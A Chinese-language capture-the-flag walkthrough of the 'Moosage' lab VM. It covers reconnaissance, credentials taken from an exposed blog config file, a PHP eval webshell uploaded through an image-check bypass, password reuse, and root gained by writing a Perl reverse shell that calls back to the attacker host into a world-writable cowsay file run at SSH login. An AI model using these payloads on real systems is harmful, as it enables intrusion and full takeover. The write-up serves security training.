# Moosage

:::note

[Linux VM] [Tested on VirtualBox] created by || sml

⏲️ Release Date // 2021-04-26

✔️ MD5 // b26a6125972ea8b288767842e0c22aa3

☠ Root // 22

💀 User // 23

📝Notes //
Hack and fun.

:::

## 靶机启动

靶机 IP

```plaintext
192.168.56.126
```

## nmap 信息搜集

```plaintext
Nmap scan report for 192.168.56.126
Host is up (0.00047s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 02:65:e6:05:af:c8:81:9c:30:b0:da:e3:1e:d8:be:02 (RSA)
|   256 3f:7d:4b:86:8d:c7:01:8f:b3:56:6d:65:c2:e5:cf:4e (ECDSA)
|_  256 8e:d4:b8:d6:8e:d9:61:a1:3e:7f:5e:d7:ec:dc:bb:de (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: 403 Forbidden
```

## web 服务

尝试直接访问 `/` 路由，网站返回

```plaintext
403 Forbidden
```

尝试目录爆破，得到

```plaintext
[15:55:41] 301 -  185B  - /blog  ->  http://192.168.56.126/blog/
[15:55:41] 200 -   10KB - /blog/
```

### `/blog` 路由

尝试目录爆破，得到

```plaintext
200      GET      213l      403w     3891c http://192.168.56.126/blog/static/styles/lightbox.css
200      GET      292l      921w     7770c http://192.168.56.126/blog/static/scripts/autosize.js
200      GET       10l       27w     1404c http://192.168.56.126/blog/static/images/profile.jpg
200      GET      198l      440w     4317c http://192.168.56.126/blog/static/scripts/datepick.js
200      GET        4l       10w      438c http://192.168.56.126/blog/static/images/zpEYXu5Wdu6.png
301      GET        7l       12w      185c http://192.168.56.126/blog/app => http://192.168.56.126/blog/app/
200      GET     1293l     2393w    23974c http://192.168.56.126/blog/static/styles/theme02.css
200      GET      140l      288w     2330c http://192.168.56.126/blog/static/styles/main.css
301      GET        7l       12w      185c http://192.168.56.126/blog/data => http://192.168.56.126/blog/data/
200      GET       83l      105w     1026c http://192.168.56.126/blog/static/styles/highlight-monokai-sublime.css
200      GET     1102l     2150w    25882c http://192.168.56.126/blog/static/scripts/app.js
200      GET       14l       61w     3142c http://192.168.56.126/blog/static/images/profile_big.jpg
200      GET      508l     1672w    18089c http://192.168.56.126/blog/static/scripts/lightbox.js
200      GET       44l     3937w   100276c http://192.168.56.126/blog/static/scripts/highlight-10.1.2.min.js
200      GET        4l     1292w    86351c http://192.168.56.126/blog/static/scripts/jquery.min.js
200      GET      268l      683w    10091c http://192.168.56.126/blog/
301      GET        7l       12w      185c http://192.168.56.126/blog/static/scripts => http://192.168.56.126/blog/static/scripts/
403      GET        7l       10w      169c http://192.168.56.126/blog/static/
301      GET        7l       12w      185c http://192.168.56.126/blog/static/images => http://192.168.56.126/blog/static/images/
301      GET        7l       12w      185c http://192.168.56.126/blog/static => http://192.168.56.126/blog/static/
403      GET        7l       10w      169c http://192.168.56.126/blog/static/scripts/
403      GET        7l       10w      169c http://192.168.56.126/blog/static/images/
301      GET        7l       12w      185c http://192.168.56.126/blog/static/styles => http://192.168.56.126/blog/static/styles/
403      GET        7l       10w      169c http://192.168.56.126/blog/static/styles/
301      GET        7l       12w      185c http://192.168.56.126/blog/app/db => http://192.168.56.126/blog/app/db/
301      GET        7l       12w      185c http://192.168.56.126/blog/app/lang => http://192.168.56.126/blog/app/lang/
301      GET        7l       12w      185c http://192.168.56.126/blog/app/db/mysql => http://192.168.56.126/blog/app/db/mysql/
```

在其中发现一个不常见文件

```plaintext
http://192.168.56.126/blog/static/images/zpEYXu5Wdu6.png
```

尝试匹配相关开源仓库中的代码，找到 [m1k1o/blog: Lightweight self-hosted facebook-styled PHP blog.](https://github.com/m1k1o/blog/)

找到一份配置文件

```plaintext title="http://192.168.56.126/blog/config.ini"
[database]
db_connection = sqlite
;sqlite_db = data/sqlite.db

;[database]
db_connection = mysql
mysql_socket = /run/mysqld/mysqld.sock
mysql_host = localhost
mysql_port = 3306
mysql_user = baca
mysql_pass = youareinsane
db_name = moosage

[profile]
title = Blog
name = Max Musermann
pic_small = static/images/profile.jpg
pic_big = static/images/profile_big.jpg
;cover = static/images/cover.jpg

[language]
lang = en

[components]
highlight = true

[custom]
theme = theme02
;header = data/header.html
;styles[] = static/styles/custom1.css
;styles[] = static/styles/custom2.css
;scripts = static/styles/scripts.css

[bbcode]
;bbtags[quote] = "<quote>{param}</quote>"

[admin]
force_login = true
nick = demo
pass = demo

[friends]
;friends[user] = pass
;friends[user] = pass

[directories]
images_path = data/i/
thumbnails_path = data/t/
logs_path = data/logs/

[proxy]
;proxy = hostname:port
;proxyauth = username:password
;proxytype = CURLPROXY_HTTP ; default, if not set
;proxytype = CURLPROXY_SOCKS4
;proxytype = CURLPROXY_SOCKS5

;URL_PREFIX type:
;proxy = http://your.page.com/proxy.cgi?
;proxyauth = username:password
;proxytype = URL_PREFIX

[system]
;timezone = Europe/Vienna
system_name = blog
version = 1.3
debug = false
logs = false
```

在其中找到了一份数据库凭据

```plaintext
baca:youareinsane
```

同时还有网站 admin 权限的凭据

```plaintext
demo:demo
```

## 文件上传接口部署 webshell

取得 admin 权限之后，发现文章编辑的界面存在上传图片的功能，尝试上传 php 文件

首先，前端对文件类型做了检测，如果是非图片文件就会返回

```plaintyext
Only images can be uploaded.
```

使用图片后缀名进行上传 webshell 的话，则会返回

```plaintext
POST /blog/ajax.php?action=upload_image HTTP/1.1
Host: 192.168.56.126
Content-Length: 220
Accept: application/json, text/javascript, */*; q=0.01
Csrf-Token: 2bcce878a8
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8sP27qQBgBO4GBPd
Origin: http://192.168.56.126
Referer: http://192.168.56.126/blog/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=tpvhqhfhbehp1sg4tk0od9s2pn
Connection: close

------WebKitFormBoundary8sP27qQBgBO4GBPd
Content-Disposition: form-data; name="file"; filename="webshell.php.png"
Content-Type: image/png

<?php @eval($_POST['shell']) ?>
------WebKitFormBoundary8sP27qQBgBO4GBPd--


HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Sun, 03 Mar 2024 08:56:48 GMT
Content-Type: application/json
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 47

{"error":true,"msg":"File is not valid image."}
```

尝试使用 `GIF8` 作为文件开头进行上传

```plaintext
POST /blog/ajax.php?action=upload_image HTTP/1.1
Host: 192.168.56.126
Content-Length: 220
Accept: application/json, text/javascript, */*; q=0.01
Csrf-Token: 2bcce878a8
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjq6FmbKJJ3r1PCcW
Origin: http://192.168.56.126
Referer: http://192.168.56.126/blog/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=tpvhqhfhbehp1sg4tk0od9s2pn
Connection: close

------WebKitFormBoundaryjq6FmbKJJ3r1PCcW
Content-Disposition: form-data; name="file"; filename="webshell.php.png"
Content-Type: image/png

<?php @eval($_POST['shell']) ?>
------WebKitFormBoundaryjq6FmbKJJ3r1PCcW--


HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Sun, 03 Mar 2024 08:58:38 GMT
Content-Type: application/json
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 56

{"path":"data\/i\/3BXa.php","thumb":"data\/t\/3BXa.php"}
```

成功上传了 webshell，并且能够成功解析

## User - www-data

```shell
┌─[randark@parrot]─[~]
└──╼ $ nc -lvnp 9999
listening on [any] 9999 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.126] 34714
whoami
www-data
```

### mysql 数据库

使用上文发现的 mysql 数据库凭据

```plaintext
baca:youareinsane
```

```sql
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| moosage            |
+--------------------+

MariaDB [moosage]> select * from images,posts;
+----+------------------+-----------------+-----------------+------+----------------------------------+---------------------+--------+----+-------------+-------------+---------+---------+----------+---------+--------------+---------+---------------------+--------+
| id | name             | path            | thumb           | type | md5                              | datetime            | status | id | text        | plain_text  | feeling | persons | location | content | content_type | privacy | datetime            | status |
+----+------------------+-----------------+-----------------+------+----------------------------------+---------------------+--------+----+-------------+-------------+---------+---------+----------+---------+--------------+---------+---------------------+--------+
|  1 | webshell.php.png | NULL            | NULL            | png  | ecca200f22ffc0aeafced51271806e2c | 2024-03-03 03:55:14 |      0 |  1 | Super TEST! | Super TEST! |         |         |          |         |              | public  | 2021-04-22 14:30:01 |      1 |
|  2 | webshell.php.png | NULL            | NULL            | png  | ecca200f22ffc0aeafced51271806e2c | 2024-03-03 03:56:48 |      0 |  1 | Super TEST! | Super TEST! |         |         |          |         |              | public  | 2021-04-22 14:30:01 |      1 |
|  3 | webshell.php     | data/i/3BXa.php | data/t/3BXa.php | php  | 2a0d8dc341c5021211ad4b717ff113a2 | 2024-03-03 03:58:38 |      1 |  1 | Super TEST! | Super TEST! |         |         |          |         |              | public  | 2021-04-22 14:30:01 |      1 |
+----+------------------+-----------------+-----------------+------+----------------------------------+---------------------+--------+----+-------------+-------------+---------+---------+----------+---------+--------------+---------+---------------------+--------+
```

未发现有价值信息

## User - baca

使用上文发现的 mysql 凭据进行登录

```shell
(remote) www-data@moosage:/var/www/html/blog/data/i$ su baca
Password:
baca@moosage:/var/www/html/blog/data/i$ whoami
baca
```

### flag - user

```shell
baca@moosage:~$ cat user.txt
hmvmessageme
```

### 通过 SSH 登录

首先，创建文件夹，并写入 `authorized_keys` 文件

```shell
(remote) baca@moosage:/home/baca$ mkdir .ssh
(remote) baca@moosage:/home/baca$ chmod 700 .ssh
(remote) baca@moosage:/home/baca$ nano .ssh/authorized_keys
(remote) baca@moosage:/home/baca$ cat .ssh/authorized_keys
......
```

随后尝试进行连接

```shell
┌─[randark@parrot]─[~]
└──╼ $ ssh baca@192.168.56.126
 ___________________________
<WELCOME TO MOOSAGE SYSTEM>
 ---------------------------
     \
      \
        ,__, |    |
        (oo)\|    |___
        (__)\|    |   )\_
             |    |_w |  \
             |    |  ||   *

             Cower....

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Mar  3 04:29:55 2024 from 192.168.56.102
baca@moosage:~$ whoami
baca
```

## SSH 脚本注入

观察 SSH 登陆界面的欢迎语，可以联想到这个工具 `Cowsay`

查看 `Cowsay` 程序的脚本路径 `/usr/share/cowsay/cows`

```shell
-rw-rw-rw- 1 root root  115 Feb  3  2019 apt.cow
-rw-rw-rw- 1 root root  310 Aug 14  1999 bud-frogs.cow
-rw-rw-rw- 1 root root  123 Aug 14  1999 bunny.cow
-rw-rw-rw- 1 root root 1.2K Feb  3  2019 calvin.cow
-rw-rw-rw- 1 root root  480 Aug 14  1999 cheese.cow
-rw-rw-rw- 1 root root  181 Feb  3  2019 cock.cow
-rw-rw-rw- 1 root root  230 Aug 14  1999 cower.cow
-rw-rw-rw- 1 root root  569 Aug 14  1999 daemon.cow
-rw-rw-rw- 1 root root  175 Aug 14  1999 default.cow
-rw-rw-rw- 1 root root 1.3K Nov  3  1999 dragon-and-cow.cow
-rw-rw-rw- 1 root root 1000 Aug 14  1999 dragon.cow
-rw-rw-rw- 1 root root  132 Feb  3  2019 duck.cow
-rw-rw-rw- 1 root root  284 Aug 14  1999 elephant.cow
-rw-rw-rw- 1 root root  357 Feb  3  2019 elephant-in-snake.cow
-rw-rw-rw- 1 root root  585 Aug 14  1999 eyes.cow
-rw-rw-rw- 1 root root  490 Aug 14  1999 flaming-sheep.cow
-rw-rw-rw- 1 root root 1018 Aug 14  1999 ghostbusters.cow
-rw-rw-rw- 1 root root 1.1K Feb  3  2019 gnu.cow
-rw-rw-rw- 1 root root  126 Aug 14  1999 hellokitty.cow
-rw-rw-rw- 1 root root  687 Feb  3  2019 kangaroo.cow
-rw-rw-rw- 1 root root  637 Aug 14  1999 kiss.cow
-rw-rw-rw- 1 root root  162 Aug 14  1999 koala.cow
-rw-rw-rw- 1 root root  406 Aug 14  1999 kosh.cow
-rw-rw-rw- 1 root root  226 Feb  3  2019 luke-koala.cow
-rw-rw-rw- 1 root root  814 Feb  3  2019 mech-and-cow.cow
-rw-rw-rw- 1 root root  439 Aug 14  1999 milk.cow
-rw-rw-rw- 1 root root  249 Feb  3  2019 moofasa.cow
-rw-rw-rw- 1 root root  203 Aug 14  1999 moose.cow
-rw-rw-rw- 1 root root 1.6K Feb  3  2019 pony.cow
-rw-rw-rw- 1 root root  305 Feb  3  2019 pony-smaller.cow
-rw-rw-rw- 1 root root  252 Aug 14  1999 ren.cow
-rw-rw-rw- 1 root root  234 Aug 14  1999 sheep.cow
-rw-rw-rw- 1 root root  433 Aug 14  1999 skeleton.cow
-rw-rw-rw- 1 root root  283 Feb  3  2019 snowman.cow
-rw-rw-rw- 1 root root  854 Aug 14  1999 stegosaurus.cow
-rw-rw-rw- 1 root root  364 Aug 14  1999 stimpy.cow
-rw-rw-rw- 1 root root  229 Feb  3  2019 suse.cow
-rw-rw-rw- 1 root root  293 Aug 14  1999 three-eyes.cow
-rw-rw-rw- 1 root root 1.3K Aug 14  1999 turkey.cow
-rw-rw-rw- 1 root root 1.1K Aug 14  1999 turtle.cow
-rw-rw-rw- 1 root root  215 Nov 12  1999 tux.cow
-rw-rw-rw- 1 root root 1.7K Feb  3  2019 unipony.cow
-rw-rw-rw- 1 root root  365 Feb  3  2019 unipony-smaller.cow
-rw-rw-rw- 1 root root  279 Aug 14  1999 vader.cow
-rw-rw-rw- 1 root root  213 Aug 14  1999 vader-koala.cow
-rw-rw-rw- 1 root root  248 Aug 14  1999 www.cow
```

并且通过多次登录，发现 SSH 欢迎界面上始终都是 `cower.cow` 脚本的内容，那么就可以通过控制 `cower.cow` 脚本，从而实现通过 SSH 调用 `Cowsay` 的过程得到 `root` 权限

## User - root

首先，将恶意载荷植入 `cower.cow`

:::note

`.cow` 脚本文件实质上是 `perl` 脚本

:::

```shell
(remote) baca@moosage:/usr/share/cowsay/cows$ echo "" > cower.cow
(remote) baca@moosage:/usr/share/cowsay/cows$ echo 'use Socket;$i="192.168.56.102";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};' > cower.cow
(remote) baca@moosage:/usr/share/cowsay/cows$ cat cower.cow
use Socket;$i="192.168.56.102";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};
```

然后启动 SSH 会话

```shell
ssh baca@192.168.56.126
```

成功收到回连的 shell

```shell
┌─[randark@parrot]─[~]
└──╼ $ pwncat-cs -lp 1234
[19:53:32] Welcome to pwncat 🐈!
[19:54:27] received connection from 192.168.56.126:57164
[19:54:28] 192.168.56.126:57164: registered new host w/ db
(local) pwncat$ back
(remote) root@moosage:/# whoami
root
```

### flag - user

```shell
(remote) root@moosage:/root# cat root.txt
hmvyougotmooooooo
```
